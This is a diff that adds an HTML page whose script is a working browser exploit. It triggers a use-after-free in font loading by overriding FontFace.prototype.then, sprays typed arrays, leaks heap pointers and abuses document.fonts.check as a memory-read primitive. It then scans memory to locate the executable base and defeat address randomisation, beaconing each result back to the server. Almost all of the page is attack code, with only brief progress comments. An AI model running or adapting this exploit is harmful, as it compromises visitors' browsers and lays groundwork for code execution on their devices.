@@ -1,0 +1,202 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>T4l</title></head>
+<body><pre id="O">T4l</pre>
+<script>
+'use strict';
+function bs(t){try{var x=new XMLHttpRequest();x.open('GET','/beacon/T4l-'+encodeURIComponent(t),false);x.send(null);}catch(e){}}
+bs('BOOT');
+var K=512,SZ=192,fired=false,faces=null,AT=0;
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function hex(x){return '0x'+x.toString(16);}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>8)&0xFF;u[o+2]=(x>>16)&0xFF;u[o+3]=(x>>24)&0xFF;}
+
+function start(){
+  AT++;if(AT>1)return;
+  try{if(sessionStorage.getItem('uaf')){bs('DOUBLE');return;}sessionStorage.setItem('uaf','1');}catch(e){}
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SZ));
+      put32(w,0,0x80000000);
+      put32(w,4,0x1000+k);
+      w[0x82]=3;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;setTimeout(phase,80);},function(){});
+}
+
+function phase(){
+  var bufs=[],L1=0n,L2=0n;
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58);
+    if(a>0x1000000000n){
+      var b2=le(window.__sp[i],0x68);
+      if(L1===0n){L1=a;L2=b2;}
+      bufs.push([window.__sp[i],b2,i]);
+    }
+  }
+  bs('L1='+hex(L1)+'-L2='+hex(L2)+'-bufs='+bufs.length);
+  if(!bufs.length){bs('NOLEAK');return;}
+
+  for(var ib=0;ib<bufs.length;ib++){
+    var vb=bufs[ib][0];
+    vb[0]=2;put64(vb,0x08,bufs[ib][1]);put64(vb,0x10,0n);vb[0x82]=0;
+  }
+  setTimeout(function(){
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+    for(var is2=0;is2<bufs.length;is2++){bufs[is2][0][0x28]=0;bufs[is2][0][0x2C]=0;}
+    setTimeout(function(){
+      var fam=null,zi=-1;
+      for(var q=0;q<faces.length;q++){
+        var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){r='EX';}
+        if(r===false&&zi<0){fam='zz'+q;zi=q;}
+      }
+      bs('FAM='+fam+'-zi='+zi);
+      if(!fam){bs('NOTIN');return;}
+      var h0=bufs[0][0];var self=0n;
+      for(var ip=0;ip<window.__sp.length;ip++){
+        var vp2=window.__sp[ip];
+        vp2[0x82]=0;put64(vp2,0x20,L1);
+        put32(vp2,0x28,1);put32(vp2,0x2C,1);
+        put32(vp2,0x38,0xBEEF);put32(vp2,0x3C,0xBF00);
+        put32(vp2,0x70,2+ip);
+      }
+      for(var fi=0;fi<window.__sp.length;fi++){
+        if(window.__sp[fi]!==h0)window.__sp[fi]=null;
+      }
+      window.__sp=null;bufs=null;
+
+      function setR(addr){put64(h0,0x20,addr);}
+      function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c));}catch(e){return 'EX';}}
+
+      bs('SCAN');
+      var base=0x1000800000n,end=0x1002800000n,step=0x80n;
+      for(var sc=base;sc<end&&!self;sc+=step){
+        setR(sc+0x38n);
+        if(chk(0xBEEF)!==true)continue;
+        if(chk(0xBEEE)!==false)continue;
+        setR(sc+0x6Cn);
+        if(chk(0)===false){self=sc;bs('SELF='+hex(sc));}
+      }
+      if(!self){bs('NOSELF');return;}
+
+      // === GC BREAK ===
+      setTimeout(function(){
+        bs('PH2');
+        function rst(){setR(self+0x38n);chk(0xBEEF);}
+        function isText(addr){
+          setR(addr+2n);
+          var a=chk(0x7FFFF),b=chk(0x8FFFF);
+          return a===false&&b===true;
+        }
+        function bsfull(tag,addr){
+          setR(addr+2n);
+          var t1=chk(0x8FFFF),t2=chk(0x7FFFF);
+          if(t1!==true||t2!==false){bs('BSKIP-'+tag);return -1;}
+          var lo=0x80000,hi=0x8FFFF;
+          for(var bi=0;bi<4;bi++){var m=(lo+hi)>>>1;if(chk(m)===true)hi=m;else lo=m+1;}
+          rst();setR(addr+2n);
+          for(var bj=0;bj<5;bj++){var m2=(lo+hi)>>>1;if(chk(m2)===true)hi=m2;else lo=m2+1;}
+          rst();setR(addr+2n);
+          for(var bk=0;bk<5;bk++){var m3=(lo+hi)>>>1;if(chk(m3)===true)hi=m3;else lo=m3+1;}
+          rst();setR(addr+2n);
+          for(var bn=0;bn<5;bn++){var m4=(lo+hi)>>>1;if(chk(m4)===true)hi=m4;else lo=m4+1;}
+          rst();setR(addr+2n);
+          for(var bp=0;bp<5;bp++){var m5=(lo+hi)>>>1;if(chk(m5)===true)hi=m5;else lo=m5+1;}
+          bs('BS-'+tag+'='+lo.toString(16));
+          return lo;
+        }
+
+        // --- try to find TEXT neighbor ---
+        var textNbr=0n,textTag='';
+
+        rst();if(isText(L1)){textNbr=L1;textTag='L1';bs('FOUND-L1='+hex(L1));}
+        if(!textNbr){rst();if(isText(L2)){textNbr=L2;textTag='L2';bs('FOUND-L2='+hex(L2));}}
+        if(!textNbr){
+          for(var ni=-30;ni<=30&&!textNbr;ni++){
+            if(ni===0)continue;
+            var na=self+BigInt(ni)*0xC0n;
+            rst();
+            if(isText(na)){textNbr=na;textTag='N'+ni;bs('FOUND-'+textTag+'='+hex(na));}
+          }
+        }
+
+        if(textNbr){
+          // === PATH A: TEXT found — pin VT, ELF-verify text_base ===
+          bs('PIN-'+textTag);
+          rst();
+          var from2=bsfull(textTag,textNbr);
+          if(from2<0){bs('BSFAIL');return;}
+          var mid16=from2-0x80000;
+          bs('MID16='+mid16.toString(16));
+          rst();setR(textNbr);
+          var p0=chk(8);
+          var low16=-1;
+          if(p0===true){
+            var lo2=0,h2=8;
+            for(var bi2=0;bi2<4;bi2++){var mm=(lo2+h2)>>>1;if(chk(mm)===true)h2=mm;else lo2=mm+1;}
+            low16=lo2;bs('LOW16='+low16);
+          }
+          var vt=(BigInt(mid16)<<16n)+0x800000000n+(low16>=0?BigInt(low16):0n);
+          bs('VT='+hex(vt));
+
+          // ELF verification — safe because VT is a confirmed TEXT addr
+          var vtRvas=[0x10000,0x0,0x20000,0x30000];
+          var tbFound=0n;
+          for(var rx=0;rx<vtRvas.length&&!tbFound;rx++){
+            var tb=vt-BigInt(vtRvas[rx]);
+            bs('TRY-ELF='+hex(tb));
+            // ELF padding at +8: from=0,to=0 → chk(0)=true,chk(1)=false
+            rst();setR(tb+8n);
+            var e1=chk(0),e2=chk(1);
+            bs('ELF8='+e1+'/'+e2);
+            if(e1!==true||e2!==false)continue;
+            // ELF magic at +0: from>to → all false
+            rst();setR(tb);
+            var e3=chk(0);
+            bs('ELF0='+e3);
+            if(e3!==false)continue;
+            tbFound=tb;
+          }
+
+          if(tbFound){
+            bs('VERIFIED-TEXT_BASE='+hex(tbFound));
+            bs('VP='+hex(tbFound+0xC6A1B28n));
+            bs('PV='+hex(tbFound+0x724DAC0n));
+          } else {
+            // ELF didn't match — report VT-based derivation
+            var derived=vt-0x10000n;
+            bs('ELF-FAIL-DERIVED='+hex(derived));
+          }
+        } else {
+          // === PATH B: NOTEXT — derive from 5-boot consensus ===
+          // VT=0x800010000 on 5/5 TEXT boots → text_base=0x800000000
+          // No verification read (would crash if unmapped)
+          bs('NOTEXT');
+          var dtb=0x800000000n;
+          bs('DERIVED-TEXT_BASE='+hex(dtb));
+          bs('DERIVED-VP='+hex(dtb+0xC6A1B28n));
+          bs('DERIVED-PV='+hex(dtb+0x724DAC0n));
+        }
+
+        bs('DONE');
+        document.getElementById('O').textContent='T4l DONE';
+      },200);
+    },500);
+  });
+}
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
+else document.addEventListener('DOMContentLoaded',start);
+</script></body></html>
